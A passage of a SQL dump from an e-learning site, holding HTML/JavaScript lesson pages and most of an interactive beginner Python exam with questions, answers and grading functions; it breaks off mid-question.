=>\n    `<button class="outcome-btn ${i===0?''active'':''''}" onclick="showOutcome(${i}, this)">${i+1}. ${o.title}</button>`\n  ).join('''');\n\n  let panels = unit.outcomes.map((o, oi) => {\n    let topics = o.topics.map(t => `<li>${t}</li>`).join('''');\n    let methods = o.methods.map(m => `<div class="method-chip">${m}</div>`).join('''');\n    let quizHTML = o.quiz && o.quiz.length ? buildQuiz(o.quiz, oi) : ''<p style="color:var(--muted);font-size:.85rem;">Quiz questions will be added for this outcome.</p>'';\n\n    return `\n    <div class="lesson-panel ${oi===0?''active'':''''}" id="panel-${oi}">\n      <div class="content-card">\n        <h3><span class="icon">📖</span>Learning Content</h3>\n        <ul class="topic-list">${topics}</ul>\n      </div>\n      <div class="content-card">\n        <h3><span class="icon">📝</span>Assessment Methods</h3>\n        <div class="methods-grid">${methods || ''<span style="color:var(--muted);font-size:.85rem;">See unit documentation</span>''}</div>\n      </div>\n      <div class="quiz-card">\n        <h3>🧠 Knowledge Check — ${o.title}</h3>\n        ${quizHTML}\n      </div>\n    </div>`;\n  }).join('''');\n\n  lv.innerHTML = `\n    <button class="lesson-back" onclick="goHome()">← Back to Units</button>\n    <div class="lesson-header">\n      <div class="unit-code">UNIT CODE: ${unit.code}</div>\n      <h2>${unit.title}</h2>\n      <p>${unit.desc}</p>\n      <div class="lesson-meta-row">\n        <span class="badge">⏱ ${unit.hours} hours</span>\n        <span class="badge">🎯 ${unit.credits} credits</span>\n        <span class="badge">📋 ${unit.outcomes.length} learning outcomes</span>\n      </div>\n    </div>\n    <div class="progress-bar-wrap"><div class="progress-bar" id="prog" style="width:${Math.round(100/unit.outcomes.length)}%"></div></div>\n    <div class="outcomes-nav">${outcomeButtons}</div>\n    ${panels}\n  `;\n  window.scrollTo(0, 0);\n}\n\nfunction buildQuiz(questions, oi) {\n  return questions.map((q, qi) => {\n    const letters = [''A'',''B'',''C'',''D''];\n    let opts = q.opts.map((opt, oi2) =>\n      `<button class="option-btn" onclick="checkAnswer(this, ${oi2 === q.ans}, ''${escStr(q.exp)}'', ''qblock-${oi}-${qi}'')">\n        <span class="option-letter">${letters[oi2]}</span>${opt}\n      </button>`\n    ).join('''');\n    return `\n    <div class="question-block" id="qblock-${oi}-${qi}">\n      <div class="question-text">Q${qi+1}: ${q.q}</div>\n      <div class="options">${opts}</div>\n      <div class="feedback" id="fb-${oi}-${qi}"></div>\n    </div>`;\n  }).join('''');\n}\n\nfunction escStr(s) { return (s||'''').replace(/''/g,"&#39;").replace(/"/g,''&quot;''); }\n\nfunction checkAnswer(btn, correct, explanation, blockId) {\n  const block = document.getElementById(blockId);\n  if (!block || block.dataset.answered) return;\n  block.dataset.answered = ''1'';\n  block.querySelectorAll(''.option-btn'').forEach(b => {\n    b.classList.add(''disabled'');\n    if (b === btn) b.classList.add(correct ? ''correct'' : ''wrong'');\n  });\n  const parts = blockId.split(''-'');\n  const fbId = `fb-${parts[1]}-${parts[2]}`;\n  const fb = document.getElementById(fbId);\n  if (fb) {\n    fb.className = `feedback ${correct?''correct'':''wrong''} show`;\n    fb.textContent = (correct ? ''✅ Correct! '' : ''❌ Not quite. '') + decodeStr(explanation);\n  }\n}\n\nfunction decodeStr(s) { const t=document.createElement(''textarea''); t.innerHTML=s; return t.value; }\n\nfunction showOutcome(idx, btn) {\n  document.querySelectorAll(''.outcome-btn'').forEach(b => b.classList.remove(''active''));\n  document.querySelectorAll(''.lesson-panel'').forEach(p => p.classList.remove(''active''));\n  btn.classList.add(''active'');\n  const panel = document.getElementById(`panel-${idx}`);\n  if (panel) panel.classList.add(''active'');\n  const total = document.querySelectorAll(''.outcome-btn'').length;\n  const prog = document.getElementById(''prog'');\n  if (prog) prog.style.width = Math.round((idx+1)/total*100) + ''%'';\n  window.scrollTo(0, 0);\n}\n\nfunction goHome() {\n  document.getElementById(''home'').style.display = ''block'';\n  const lv = document.getElementById(''lesson-view'');\n  lv.classList.remove(''active'');\n  lv.innerHTML = '''';\n  window.scrollTo(0, 0);\n}\n\nrenderCards();\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 0, 'Published', 1, '2026-03-04 08:28:27', '2026-03-04 08:28:27', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(10, 9, NULL, 'Python Exam', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Python Fundamentals Exam</title>\n<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;600;700&family=Fraunces:ital,wght@0,300;0,700;0,900;1,300&display=swap" rel="stylesheet">\n<style>\n  :root{\n    --bg:#f4efe6;--card:#fff;--border:#d8d0c4;--border2:#c5bcb0;\n    --ink:#1c1712;--ink2:#4a4035;--muted:#8c7f70;\n    --accent:#b5320a;--green:#2a6b3f;--amber:#c47a0a;\n    --code-bg:#181310;--code-text:#e6ddd0;\n  }\n  *{margin:0;padding:0;box-sizing:border-box;}\n  body{background:var(--bg);color:var(--ink);font-family:''Fraunces'',serif;min-height:100vh;}\n  body::before{content:'''';position:fixed;inset:0;background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(181,50,10,.04) 27px,rgba(181,50,10,.04) 28px);pointer-events:none;z-index:0;}\n  .wrap{position:relative;z-index:1;max-width:800px;margin:0 auto;padding:28px 20px 80px;}\n\n  /* welcome */\n  .hd{text-align:center;padding:52px 0 38px;}\n  .stamp{display:inline-block;border:3px double var(--accent);padding:5px 18px;font-family:''IBM Plex Mono'',monospace;font-size:10px;letter-spacing:4px;text-transform:uppercase;color:var(--accent);margin-bottom:20px;}\n  .hd h1{font-size:clamp(2rem,5.5vw,3.8rem);font-weight:900;line-height:1.05;letter-spacing:-2px;margin-bottom:10px;}\n  .hd h1 em{font-style:italic;color:var(--accent);}\n  .hd p{font-family:''IBM Plex Mono'',monospace;font-size:12px;color:var(--muted);letter-spacing:1px;}\n\n  .topics{background:var(--card);border:1px solid var(--border);border-top:3px solid var(--accent);padding:22px 28px;margin-bottom:20px;}\n  .topics h3{font-family:''IBM Plex Mono'',monospace;font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--muted);margin-bottom:12px;}\n  .pills{display:flex;flex-wrap:wrap;gap:8px;}\n  .pill{font-family:''IBM Plex Mono'',monospace;font-size:11px;background:var(--bg);border:1px solid var(--border2);padding:4px 12px;color:var(--ink2);}\n\n  .rules-box{background:var(--card);border:1px solid var(--border);padding:22px 28px;margin-bottom:26px;}\n  .rules-box h3{font-family:''IBM Plex Mono'',monospace;font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--muted);margin-bottom:14px;}\n  .rg{display:grid;grid-template-columns:1fr 1fr;gap:9px;}\n  .ri{display:flex;gap:9px;font-family:''IBM Plex Mono'',monospace;font-size:11.5px;color:var(--ink2);line-height:1.5;}\n  .ri::before{content:''→'';color:var(--accent);flex-shrink:0;}\n\n  /* progress */\n  .prog{display:flex;align-items:center;gap:14px;background:var(--card);border:1px solid var(--border);padding:13px 18px;margin-bottom:22px;}\n  .prog-lbl{font-family:''IBM Plex Mono'',monospace;font-size:11px;color:var(--muted);white-space:nowrap;min-width:76px;}\n  .prog-track{flex:1;height:4px;background:var(--border);}\n  .prog-fill{height:100%;background:var(--accent);transition:width .4s ease;}\n  .timer{font-family:''IBM Plex Mono'',monospace;font-size:13px;font-weight:600;color:var(--amber);white-space:nowrap;min-width:50px;text-align:right;}\n  .timer.warn{color:var(--accent);animation:blink 1s infinite;}\n  @keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}\n\n  /* question card */\n  .qcard{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--ink);padding:30px 34px;margin-bottom:14px;animation:up .28s ease;}\n  @keyframes up{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}\n  .qmeta{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;margin-bottom:16px;}\n  .qnum{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}\n  .qcat{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);border:1px solid var(--border2);padding:3px 9px;background:var(--bg);}\n  .qtype{font-family:''IBM Plex Mono'',monospace;font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:3px 8px;margin-left:6px;}\n  .t-out{background:#e6f2ea;color:var(--green);border:1px solid #aed4b8;}\n  .t-wri{background:#fef3e0;color:var(--amber);border:1px solid #f0d080;}\n  .t-fil{background:#e8eef8;color:#2d5fa8;border:1px solid #a8bcd8;}\n  .qtxt{font-size:17px;font-weight:700;line-height:1.5;margin-bottom:16px;}\n  .code{background:var(--code-bg);color:var(--code-text);font-family:''IBM Plex Mono'',monospace;font-size:13px;line-height:1.75;padding:16px 20px;margin-bottom:16px;overflow-x:auto;white-space:pre;border-left:3px solid var(--accent);}\n  .kw{color:#ff8c69}.fn{color:#b8d4ff}.st{color:#a8d8a8}.nm{color:#ffd080}.cm{color:#60584a}.bi{color:#ffb870}\n  .albl{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:7px;display:block;}\n  .ainp{width:100%;background:var(--bg);border:1.5px solid var(--border2);color:var(--ink);font-family:''IBM Plex Mono'',monospace;font-size:14px;padding:11px 15px;outline:none;resize:vertical;min-height:50px;line-height:1.5;transition:border-color .2s;}\n  .ainp:focus{border-color:var(--ink);background:#fff;}\n  .ainp.ml{min-height:105px;}\n  .ahint{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);margin-top:5px;font-style:italic;}\n  .acts{display:flex;justify-content:flex-end;margin-top:18px;}\n  .btn{font-family:''IBM Plex Mono'',monospace;font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;padding:11px 26px;border:none;cursor:pointer;transition:all .15s;}\n  .btn-p{background:var(--ink);color:var(--bg);}\n  .btn-p:hover{background:var(--accent);}\n  .btn-p:disabled{background:var(--border2);color:var(--muted);cursor:not-allowed;}\n  .btn-s{background:var(--accent);color:#fff;font-size:13px;padding:15px 44px;letter-spacing:3px;}\n  .btn-s:hover{background:#9a2908;}\n\n  /* results */\n  #res{display:none;animation:up .4s ease;}\n  .rh{text-align:center;padding:44px 0 30px;}\n  .sring{display:flex;flex-direction:column;align-items:center;justify-content:center;width:130px;height:130px;border:3px double var(--accent);margin:0 auto 20px;}\n  .sn{font-size:44px;font-weight:900;line-height:1;color:var(--accent);}\n  .sg{font-family:''IBM Plex Mono'',monospace;font-size:12px;color:var(--muted);letter-spacing:2px;}\n  .srow{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:32px;}\n  .sb{background:var(--card);border:1px solid var(--border);padding:18px;text-align:center;}\n  .sn2{font-size:30px;font-weight:900;display:block;margin-bottom:4px;}\n  .sn2.c{color:var(--green)}.sn2.p{color:var(--amber)}.sn2.w{color:var(--accent)}\n  .slbl{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}\n  .rtitle{font-size:20px;font-weight:900;letter-spacing:-1px;margin-bottom:18px;padding-bottom:12px;border-bottom:2px solid var(--ink);}\n  .rcard{background:var(--card);border:1px solid var(--border);padding:22px 26px;margin-bottom:12px;}\n  .rcard.cor{border-left:4px solid var(--green);}\n  .rcard.par{border-left:4px solid var(--amber);}\n  .rcard.wrg{border-left:4px solid var(--accent);}\n  .rh2{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}\n  .rqn{font-family:''IBM Plex Mono'',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;}\n  .rbadge{font-family:''IBM Plex Mono'',monospace;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;padding:3px 9px;}\n  .bc{background:#e6f2ea;color:var(--green)}.bp{background:#fef3e0;color:var(--amber)}.bw{background:#fde8e6;color:var(--accent)}\n  .rq{font-size:14px;font-weight:700;margin-bottom:9px;line-height:1.4;}\n  .rcode{background:var(--code-bg);color:var(--code-text);font-family:''IBM Plex Mono'',monospace;font-size:12px;line-height:1.7;padding:11px 15px;margin-bottom:9px;overflow-x:auto;white-space:pre;border-left:3px solid var(--accent);}\n  .rans{font-family:''IBM Plex Mono'',monospace;font-size:12px;line-height:1.6;margin-bottom:3px;white-space:pre-wrap;word-break:break-word;}\n  .ry{color:var(--accent)}.rc2{color:var(--green);font-weight:600;}\n  .rexpl{font-family:''Fraunces'',serif;font-size:13px;color:var(--ink2);background:var(--bg);border:1px solid var(--border);padding:9px 13px;margin-top:9px;line-height:1.65;}\n\n  /* tab warning */\n  .tover{display:none;position:fixed;inset:0;background:rgba(20,15,10,.94);z-index:9999;align-items:center;justify-content:center;}\n  .tover.show{display:flex;}\n  .tbox{background:var(--card);border:2px solid var(--accent);padding:38px 44px;max-width:440px;text-align:center;}\n  .tbox h2{font-size:20px;font-weight:900;color:var(--accent);margin-bottom:8px;}\n  .tbox p{font-family:''IBM Plex Mono'',monospace;font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:5px;}\n  .tc{color:var(--amber);margin-bottom:18px;}\n\n  @media(max-width:580px){.rg,.srow{grid-template-columns:1fr}.qcard{padding:20px 18px}}\n</style>\n</head>\n<body>\n\n<div class="tover" id="tover">\n  <div class="tbox">\n    <h2>⚠ Tab Switch Detected</h2>\n    <p>You navigated away from the exam.</p>\n    <p class="tc" id="tmsg">Warning 1 / 3 — return to continue.</p>\n    <button class="btn btn-p" onclick="dismissTab()">Return to Exam</button>\n  </div>\n</div>\n\n<div class="wrap">\n\n  <!-- WELCOME -->\n  <div id="welcome">\n    <div class="hd">\n      <div class="stamp">Official Assessment</div>\n      <h1>Python<br><em>Fundamentals</em><br>Exam</h1>\n      <p style="margin-top:12px">30 Questions · 45 Minutes · Written Answers</p>\n    </div>\n\n    <div class="topics">\n      <h3>Topics Covered</h3>\n      <div class="pills">\n        <span class="pill">Variables &amp; Data Types</span>\n        <span class="pill">Arithmetic &amp; Operators</span>\n        <span class="pill">Boolean Expressions</span>\n        <span class="pill">if / elif / else</span>\n        <span class="pill">while loops</span>\n        <span class="pill">for loops &amp; range()</span>\n        <span class="pill">Functions &amp; return</span>\n        <span class="pill">Calling Functions</span>\n      </div>\n    </div>\n\n    <div class="rules-box">\n      <h3>Exam Rules</h3>\n      <div class="rg">\n        <div class="ri">No back button — each answer is final.</div>\n        <div class="ri">Type your answers — no multiple choice.</div>\n        <div class="ri">45-minute countdown; auto-submits at zero.</div>\n        <div class="ri">Tab switching monitored (3 strikes = submit).</div>\n        <div class="ri">No hints during the exam.</div>\n        <div class="ri">Full graded review with explanations at end.</div>\n      </div>\n    </div>\n\n    <div style="text-align:center">\n      <p style="font-family:''IBM Plex Mono'',monospace;font-size:11px;color:var(--muted);margin-bottom:22px">\n        Question types: predict output · write code · fill in the blank\n      </p>\n      <button class="btn btn-s" onclick="startExam()">Begin Exam →</button>\n    </div>\n  </div>\n\n  <!-- EXAM -->\n  <div id="exam" style="display:none">\n    <div class="prog">\n      <span class="prog-lbl" id="plbl">Q 1 / 30</span>\n      <div class="prog-track"><div class="prog-fill" id="pfill" style="width:3.33%"></div></div>\n      <span class="timer" id="timer">45:00</span>\n    </div>\n    <div id="qbox"></div>\n    <div class="acts">\n      <button class="btn btn-p" id="nxtBtn" onclick="nextQ()" disabled>Next →</button>\n    </div>\n  </div>\n\n  <!-- RESULTS -->\n  <div id="res"></div>\n\n</div>\n\n<script>\n// ─── QUESTIONS ────────────────────────────────────────────────────────────────\n// Topics: variables/types, arithmetic, boolean, if/elif/else, while, for/range, functions\n// NO strings (beyond basic print), NO lists, NO debugging questions\n\nconst QS = [\n\n// ── VARIABLES & TYPES (5 questions) ─────────────────────────────────────────\n\n/* 1 */ {\n  cat:"Variables & Types", type:"output",\n  q:"What does this code print?",\n  code:`x = 7\\ny = 3\\nprint(x + y)\\nprint(x * y)`,\n  ph:"Two lines of output", ml:true, ans:"10\\n21",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="10", ok2=ls[1]==="21";\n    if(ok1&&ok2) return{s:1,fb:"Correct. 7+3=10, 7×3=21."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. 7+3=10 and 7*3=21."};\n    return{s:0,fb:"7+3=10, 7*3=21."};\n  }\n},\n\n/* 2 */ {\n  cat:"Variables & Types", type:"output",\n  q:"What does this code print?",\n  code:`a = 10\\nb = 4\\nprint(a / b)\\nprint(a // b)`,\n  ph:"Two lines of output", ml:true, ans:"2.5\\n2",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="2.5", ok2=ls[1]==="2";\n    if(ok1&&ok2) return{s:1,fb:"Correct. / gives true division (2.5), // gives floor division (2)."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. a/b=2.5 (true division), a//b=2 (floor division)."};\n    return{s:0,fb:"/ → 2.5 (true division), // → 2 (floor division, drops decimal)."};\n  }\n},\n\n/* 3 */ {\n  cat:"Variables & Types", type:"fill",\n  q:"Fill in the blank so that z stores the integer value of dividing 15 by 4 with no remainder (floor division).",\n  code:`z = 15 ________ 4\\nprint(z)  # 3`,\n  ph:"The operator that goes in the blank", ml:false, ans:"//",\n  grade(a){\n    if(a.trim()==="//") return{s:1,fb:"Correct. // is the floor division operator."};\n    return{s:0,fb:"Answer: // (floor division operator). 15//4 = 3."};\n  }\n},\n\n/* 4 */ {\n  cat:"Variables & Types", type:"output",\n  q:"What does this code print?",\n  code:`x = 5\\nx = x + 3\\nx = x * 2\\nprint(x)`,\n  ph:"Single number", ml:false, ans:"16",\n  grade(a){\n    if(a.trim()==="16") return{s:1,fb:"Correct. x starts at 5, then 5+3=8, then 8*2=16."};\n    return{s:0,fb:"Step by step: x=5 → x=5+3=8 → x=8*2=16."};\n  }\n},\n\n/* 5 */ {\n  cat:"Variables & Types", type:"output",\n  q:"What does this code print?",\n  code:`a = 9\\nb = 4\\nprint(a % b)\\nprint(a ** 2)`,\n  ph:"Two lines of output", ml:true, ans:"1\\n81",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="1", ok2=ls[1]==="81";\n    if(ok1&&ok2) return{s:1,fb:"Correct. 9%4=1 (remainder), 9**2=81 (exponent)."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. 9%4=1 (remainder when 9 is divided by 4), 9**2=81."};\n    return{s:0,fb:"% is modulus (remainder): 9%4=1. ** is exponent: 9**2=81."};\n  }\n},\n\n// ── BOOLEAN & CONDITIONALS (8 questions) ─────────────────────────────────────\n\n/* 6 */ {\n  cat:"Boolean Expressions", type:"output",\n  q:"What does this code print?",\n  code:`print(5 > 3)\\nprint(10 == 9)\\nprint(4 != 4)`,\n  ph:"Three lines of output", ml:true, ans:"True\\nFalse\\nFalse",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="True", ok2=ls[1]==="False", ok3=ls[2]==="False";\n    if(ok1&&ok2&&ok3) return{s:1,fb:"Correct. 5>3 is True, 10==9 is False, 4!=4 is False."};\n    const n=[ok1,ok2,ok3].filter(Boolean).length;\n    if(n>=2) return{s:.5,fb:"Partial. 5>3=True, 10==9=False, 4!=4=False."};\n    return{s:0,fb:"5>3=True, 10==9=False (not equal), 4!=4=False (they are equal)."};\n  }\n},\n\n/* 7 */ {\n  cat:"Boolean Expressions", type:"output",\n  q:"What does this code print?",\n  code:`x = 8\\nprint(x > 5 and x < 15)\\nprint(x < 5 or x > 10)`,\n  ph:"Two lines of output", ml:true, ans:"True\\nFalse",\n  grade(a){\n    const ls=norm(a);\n    const ok1=ls[0]==="True", ok2=ls[1]==="False";\n    if(ok1&&ok2) return{s:1,fb:"Correct. (8>5 and 8<15)=True. (8<5 or 8>10)=False (both conditions False)."};\n    if(ok1||ok2) return{s:.5,fb:"Partial. (8>5 and 8<15)=True. (8<5 or 8>10)=False."};\n    return{s:0,fb:"8>5 AND 8<15 → both True → True. 8<5 is False AND 8>10 is False → False."};\n  }\n},\n\n/* 8 */ {\n  cat:"Conditionals", type:"output",\n  q:"What is printed?",\n  code:`score = 85\\nif score >= 90:\\n    print("A")\\nelif score >= 80:\\n    print("B")\\nelif score >= 70:\\n    print("C")\\nelse:\\n    print("F")`,\n  ph:"Single letter", ml:false, ans:"B",\n  grade(a){\n    if(a.trim()==="B") return{s:1,fb:"Correct. 85 fails >=90, but passes >=80 → ''B''."};\n    return{s:0,fb:"85 is not >=90, but is >=80 → prints ''B''. Only the first matching branch runs."};\n  }\n},\n\n/* 9 */ {\n  cat:"Conditionals", type:"output",\n  q:"What does this code print?",\n  code:`x = 15\\nif x % 2 == 0:\\n    print("even")\\nelse:\\n    print("odd")`,\n  ph:"Output", ml:false, ans:"odd",\n  grade(a){\n    if(a.trim()==="odd") return{s:1,fb:"Correct. 15%2=1, not 0, so the else branch runs."};\n    return{s:0,fb:"15%2=1 (not 0), so condition is False → else runs → ''odd''."};\n  }\n},\n\n/* 10 */ {\n  cat:"Conditionals", type:"write",\n  q:"Write an if/elif/else block that prints ''positive'' if n > 0, ''negative'' if n < 0, and ''zero'' if n equals 0.",\n  ph:"if ...:\\n    print(...)\\nelif ...:\\n    print(...)\\nelse:\\n    print(...)", ml:true,\n  ans:"if n > 0:\\n    print(''positive'')\\nelif n < 0:\\n    print(''negative'')\\nelse:\\n    print(''zero'')",\n  grade(a){\n    const c=a.trim().toLowerCase().replace(/\\s+/g," ");\n    const hasIf=c.includes("if n > 0")||c.includes("if n>0");\n    const hasElif=c.includes("elif n < 0")||c.includes("elif n<0");\n    const hasElse=c.includes("else");\n    const hasAll=c.includes("positive")&&c.includes("negative")&&c.includes("zero");\n    if(hasIf&&hasElif&&hasElse&&hasAll) return{s:1,fb:"Correct."};\n    if((hasIf||hasElif)&&hasAll) return{s:.5,fb:"Partial. Need all three branches: if n>0, elif n<0, else."};\n    return{s:0,fb:"Answer:\\nif n > 0:\\n    print(''positive'')\\nelif n < 0:\\n    print(''negative'')\\nelse:\\n    print(''zero'')"};\n  }\n},\n\n/* 11 */ {\n  cat:"Conditionals", type:"output",\n  q:"What does this code print?",\n  code:`a = 4\\nb = 7\\nif a > b:\\n    print("a is bigger")\\nelif a == b:\\n    print("equal")\\nelse:\\n    print("b is bigger")`,\n  ph:"Output", ml:false, ans:"b is bigger",\n  grade(a){\n    if(a.trim()==="b is bigger") return{s:1,fb:"Correct. 4 is not > 7, and 4 != 7, so else runs."};\n    return{s:0,fb:"4 > 7 is False, 4 == 7 is False → else → ''b is bigger''."};\n  }\n},\n\n/* 12 */ {\n  cat:"Conditionals", type:"fill",\n  q:"Fill in the blank so the condition checks whether n is divisible by 5.",\n  code:`if ________:\\n    print("divisible by 5")`,\n  ph:"The condition that goes after ''if''", ml:false, ans:"n % 5 == 0",\n  grade(a){\n    const c=a.trim().replace(/\\s/g,"");\n    if(c==="n%5==0") return{s:1,fb:"Correct. n%5==0 checks if there is no remainder when dividing by 5."};\n    if(c.includes("%5")||c.includes("% 5")) return{s:.5,fb:"Almost. Full condition: n % 5 == 0"};\n    return{s:0,fb:"Answer: n % 5 == 0 — modulus gives the remainder; ==0 means evenly divisible."};\n  }\n},\n\n/* 13 */ {\n  cat:"Conditionals", type:"output",\n  q:"What does this code print?",\n  code:`temp = 22\\nif temp > 30:\\n    print("hot")\\nelif temp > 20:\\n    print("warm")\\nelse:\\n    print("cold")`,\n  ph:"Output", ml:false, ans:"warm",\n  grade(a){\n    if(a.trim()==="warm") return{s:1,fb:"Correct. 22 is not >30, but is >20 → ''warm''."};\n    return{s:0,fb:"22 fails >30, but passes >20 → ''warm''."};\n  }\n},\n\n// ── WHILE LOOPS (5 questions) ─────────────────────────────────────────────────\n\n/* 14 */ {\n  cat:"While Loop", type:"output",\n  q:"What does this code print?",\n  code:`i = 1\\nwhile i <= 5:\\n    print(i)\\n    i += 1`,\n  ph:"All printed values, one per line", ml:true, ans:"1\\n2\\n3\\n4\\n5",\n  grade(a){\n    const ls=norm(a).filter(Boolean);\n    if(ls.join()===["1","2","3","4","5"].join()) return{s:1,fb:"Correct. Prints 1 through 5, then i becomes 6 and the condition fails."};\n    if(ls.includes("1")&&ls.includes("5")&&ls.length===5) return{s:1,fb:"Correct."};\n    if(ls.includes("1")&&ls.includes("5")) return{s:.5,fb:"Partial. Prints 1,2,3,4,5 (one per line)."};\n    return{s:0,fb:"Loop runs while i<=5: prints 1,2,3,4,5."};\n  }\n},\n\n/* 15 */ {\n  cat:"While Loop", type:"output",\n  q:"What does this code print?",\n  code:`count = 10\\nwhile count > 6:\\n    print(count)\\n    count -= 2`,\n  ph:"All printed values, one per line", ml:true, ans:"10\\n8",\n  grade(a){\n    const ls=norm(a).filter(Boolean);\n    if(ls.join()===["10","8"].join()) return{s:1,fb:"Correct. count=10 (>6 ✓), then 8 (>6 ✓), then 6 (>6 ✗ — stops)."};\n    if(ls.includes("10")&&ls.includes("8")) return{s:.5,fb:"Partial. Prints 10 then 8. count then becomes 6, which is not >6, so loop ends."};\n    return{s:0,fb:"count=10→print, count=8→print, count=6→6>6 is False→stop. Output: 10, 8."};\n  }\n},\n\n/* 16 */ {\n  cat:"While Loop", type:"fill",\n  q:"Fill in the blank so the loop prints numbers 1 to 5 by counting up.",\n  code:`i = 1\\nwhile i <= 5:\\n    print(i)\\n    ________`,\n  ph:"The missing line", ml:false, ans:"i += 1",\n  grade(a){\n    const c=a.trim().replace(/\\s/g,"");\n    if(c==="i+=1"||c==="i=i+1") return{s:1,fb:"Correct. i += 1 increments i by 1 each iteration."};\n    if(c.includes("i+")) return{s:.5,fb:"Almost. Use: i += 1"};\n    return{s:0,fb:"Answer: i += 1 (increment i by 1 each loop)."};\n  }\n},\n\n/* 17 */ {\n  cat:"While Loop", type:"write",\n  q:"Write a while loop that starts at n = 1 and keeps doubling n, printing each value, as long as n is less than 50.",\n  ph:"n = 1\\nwhile ...:\\n    print(...)\\n    ...", ml:true,\n  ans:"n = 1\\nwhile n < 50:\\n    print(n)\\n    n = n * 2",\n  grade(a){\n    const c=a.trim().toLowerCase().replace(/\\s+/g," ");\n    const hasWhile=c.includes("while")&&(c.includes("n < 50")||c.includes("n<50")||c.includes("n < 50"));\n    const hasDouble=c.includes("n * 2")||c.includes("n*2")||c.includes("n *= 2")||c.includes("n*=2");\n    const hasPrint=c.includes("print(n)");\n    if(hasWhile&&hasDouble&&hasPrint) return{s:1,fb:"Correct. Prints 1, 2, 4, 8, 16, 32 then stops (64>=50)."};\n    if(hasWhile&&(hasDouble||hasPrint)) return{s:.5,fb:"Partial. Need: while n < 50, print(n), and n = n * 2."};\n    return{s:0,fb:"Answer:\\nn = 1\\nwhile n < 50:\\n    print(n)\\n    n = n * 2"};\n  }\n},\n\n/* 18 */ {\n  cat:"While Loop", type:"output",\n  q:"What does this code print?",\n  code:`total = 0\\ni = 1\\nwhile i <= 4:\\n    total += i\\n    i += 1\\nprint(total)`,\n  ph:"Single number", ml:false, ans:"10",\n  grade(a){\n    if(a.trim()==="10") return{s:1,fb:"Correct. Accumulates 1+2+3+4=10."};\n    return{s:0,fb:"total starts at 0, then adds 1,2,3,4 → total=10."};\n  }\n},\n\n// ── FOR LOOPS & RANGE (6 questions) ──────────────────────────────────────────\n\n/* 19 */ {\n  cat:"For Loop", type:"output",\n  q:"What does this code print?",\n  code:`for i in range(5):\\n    print(i)`,\n  ph:"All printed values, one per line", ml:true, ans:"0\\n1\\n2\\n3\\n4",\n  grade(a){\n    const ls=norm(a).filter(Boolean);\n    if(ls.join()===["0","1","2","3","4"].join()) return{s:1,fb:"Correct. range(5) produces 0,1,2,3,4."};\n    if(ls.includes("0")&&ls.includes("4")&&ls.length===5) return{s:1,fb:"Correct."};\n    if(ls.includes("0")&&ls.includes("4")) return{s:.5,fb:"Partial. range(5) → 0,1,2,3,4."};\n    return{s:0,fb:"range(5) generates 0,1,2,3,4 (starts at 0, stops before 5)."};\n  }\n},\n\n/* 20 */ {\n  cat:"For Loop", type:"output",\n  q:"What does this code print?",\n  code:`for i in range(1, 6):\\n    print(i * i)`,\n  ph:"All printed values, one per line", ml:true, ans:"1\\n4\\n9\\n16\\n25",\n  grade(a){\n    const ls=norm(a).filter(Boolean);\n    if(ls.join()===["1","4","9","16","25"].join()) return{s:1,fb:"Correct. Squares of 1 through 5."};\n    if(ls.includes("1")&&ls.includes("25")&&ls.length===5) return{s:1,fb:"Correct."};\n    if(ls.includes("1")&&ls.includes("25")) return{s:.5,fb:"Partial. range(1,6) → 1,2,3,4,5; i*i → 1,4,9,16,25."};\n    return{s:0,fb:"range(1,6) gives 1,2,3,4,5. Each squared: 1,4,9,16,25."};\n  }\n},\n\n/* 21 */ {\n  cat:"For Loop", type:"fill",\n  q:"Fill in the blank so the loop prints: 0, 2, 4, 6, 8",\n  code:`for i in range(________):\\n    print(i)`,\n  ph:"The arguments that go inside range(  )", ml:false, ans:"0, 10, 2",\n  grade(a){\n    const c=a.trim().replace(/\\s/g,"");\n    if(c==="0,10,2"||c==="0,10,2") return{s:1,fb:"Correct. range(0,10,2) starts at 0, stops before 10, steps by 2."};\n    if((c==="10,2"||c.includes(",2")&&c.includes("10"))) return{s:.5,fb:"Almost. Full: 0, 10, 2 — range(0, 10, 2) gives 0,2,4,6,8."};\n    return{s:0,fb:"Answer: 0, 10, 2 → range(0, 10, 2) steps by 2: 0,2,4,6,8."};\n  }\n},\n\n/* 22 */ {\n  cat:"For Loop", type:"output",\n  q:"What does this code print?",\n  code:`total = 0\\nfor n in range(1, 11):\\n    total += n\\nprint(total)`,\n  ph:"Single number", ml:false, ans:"55",\n  grade(a){\n    if(a.trim()==="55") return{s:1,fb:"Correct. Sum of 1 through 10 